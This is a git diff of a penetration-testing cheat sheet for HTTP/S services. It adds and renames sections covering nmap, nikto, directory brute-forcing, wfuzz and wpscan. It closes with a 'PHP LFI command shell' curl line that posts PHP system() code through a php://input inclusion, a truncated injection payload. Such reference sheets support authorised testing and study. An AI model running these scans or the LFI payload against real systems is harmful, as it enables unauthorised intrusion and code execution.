@@ -4,7 +4,14 @@ description: 'TCP/80, TCP/443'
 
 # HTTP/S
 
-### nmap scans
+## Enumerating with nmap
+
+```bash
+nmap -v -n -Pn -sT -p 80,443 --open --oA report_http $range
+grep open report_http.gnmap | cut -d" " -f2 > hosts_http.txt
+```
+
+## Enumeration with NSEnmap scans
 
 ```bash
 nmap --script=http-enum -p80 -n $ip
@@ -16,13 +23,13 @@ nmap --script http-methods --script-args http-methods.url-path='/test' $ip
 nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip
 ```
 
-### uniscan
+## uniscan
 
 ```bash
  perl ./uniscan.pl -u http://www.example.com/ -qweds
 ```
 
-### nikto
+## nikto
 
 ```bash
 nikto -h $ip
@@ -30,7 +37,7 @@ nikto -C all -h http://$ip
 nmap -p80,443 $range -oG - | nikto.pl -h -
 ```
 
-### Directory scans
+## Directory scans
 
 ```bash
 ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $ip -e php
@@ -44,7 +51,7 @@ dirb [url] [folder/file] [report] -S -r
 gobuster -u http://$ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
 ```
 
-### wfuzz
+## wfuzz
 
 ```bash
 wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
@@ -59,19 +66,19 @@ wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FU
 wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
 ```
 
-### Wordpress
+## Wordpress
 
 ```bash
 wpscan --url $ip/blog
 ```
 
-### Inspection
+## Inspection
 
 ```bash
 tcpdump tcp port 80 -w output.pcap -i eth0
 ```
 
-### PHP LFI command shell
+## PHP LFI command shell
 
 ```bash
 curl -s --data "<?system (<'cmd'>);?>" LFI=php://input%00
